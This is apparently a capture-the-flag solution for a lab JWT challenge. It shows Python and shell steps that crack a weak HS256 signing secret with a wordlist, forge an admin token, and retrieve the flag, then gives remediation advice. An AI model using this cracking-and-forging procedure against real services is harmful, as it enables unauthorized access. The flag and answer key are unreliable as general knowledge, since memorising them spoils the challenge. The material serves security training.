# Solution — The Intern's Token

## Vulnerability

The app signs JWTs with `HS256` using the secret `"globex2024"` — short,
guessable, and themed after the fictional company name and a recent year.
Because HS256 is a symmetric algorithm, anyone who recovers the secret can
mint arbitrary, validly-signed tokens, including ones with an elevated
`role` claim.

## Step-by-step walkthrough

### 1. Get a token

Visit `http://localhost:5000/`. The page shows (and also sets as a cookie)
a token like:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaW50ZXJuLnNhbSIsInJvbGUiOiJlbXBsb3llZSIsImlhdCI6MTc5NDMwMTkxM30.dzCPTgp5hFJUxpLaWvfTy1N8O_dhrQJ6nBHEZDPDKI4
```

### 2. Decode it (no secret needed yet)

```python
import base64, json
header, payload, sig = "eyJhbGci...".split(".")
print(json.loads(base64.urlsafe_b64decode(payload + "==")))
# {'user': 'intern.sam', 'role': 'employee', 'iat': ...}
```

This confirms the `role` claim is what gates access, and that `alg` is
`HS256` (symmetric — crackable, unlike `RS256`).

### 3. Confirm /admin rejects the employee token

```bash
curl -b "token=<employee_token>" http://localhost:5000/admin
# {"error": "forbidden: admin role required", "your_role": "employee"}
```

So tampering with the payload alone won't work — the signature would no
longer match, and a naive edit gets rejected with an "invalid token" error.

### 4. Crack the HS256 secret

Use a short, themed wordlist (company name + common suffixes/years) and
`PyJWT`:

```python
import jwt

token = "<the employee token from step 1>"
candidates = ["password", "globex", "globex123", "globex2024",
              "secret", "admin123", "company2024"]

for c in candidates:
    try:
        jwt.decode(token, c, algorithms=["HS256"])
        print("Secret found:", c)
        break
    except jwt.InvalidTokenError:
        pass
```

Output: `Secret found: globex2024`

(Equivalently: dump the token to a file and run
`hashcat -a 0 -m 16500 token.txt wordlist.txt`, or use `jwt_tool.py -C -d wordlist.txt`.)

### 5. Forge an admin token

```python
import jwt
forged = jwt.encode({"user": "intern.sam", "role": "admin"},
                     "globex2024", algorithm="HS256")
print(forged)
```

### 6. Use the forged token against /admin

```bash
curl -H "Authorization: Bearer <forged_token>" http://localhost:5000/admin
```

Response:

```json
{"message": "Welcome, admin.", "flag": "GDG{jwt_s3cr3t_crack1ng_ftw}"}
```

## Flag

```
GDG{jwt_s3cr3t_crack1ng_ftw}
```

## Remediation notes (good talking points for players after the solve)

- Use a long, random, high-entropy secret (32+ bytes from a CSPRNG), or
  switch to asymmetric signing (`RS256`/`ES256`) so the verifying server
  never holds a secret capable of *signing* new tokens.
- Never derive secrets from predictable strings (company names, years,
  dictionary words).
- Enforce authorization server-side from a source of truth (e.g. a
  database lookup), not solely from a client-suppliable JWT claim.
